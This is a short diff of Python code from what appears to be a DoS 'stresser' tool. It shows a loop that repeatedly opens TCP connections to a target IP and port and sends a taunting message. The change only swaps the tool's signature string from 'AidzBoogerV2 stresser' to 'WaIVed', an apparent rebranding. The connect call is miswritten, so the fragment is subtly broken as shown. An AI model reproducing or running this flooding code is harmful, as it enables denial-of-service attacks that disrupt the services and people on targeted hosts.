@@ -6,7 +6,7 @@ _abort = False
 def _tcp(_ip, _prt, _min, _max):
     while _abort == False:
         try:
-            payload = 'Rekt by AidzBoogerV2 stresser!'
+            payload = 'Rekt by WaIVed!'
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s = connect((_ip, int(_prt)))
             s.send(payload.encode())
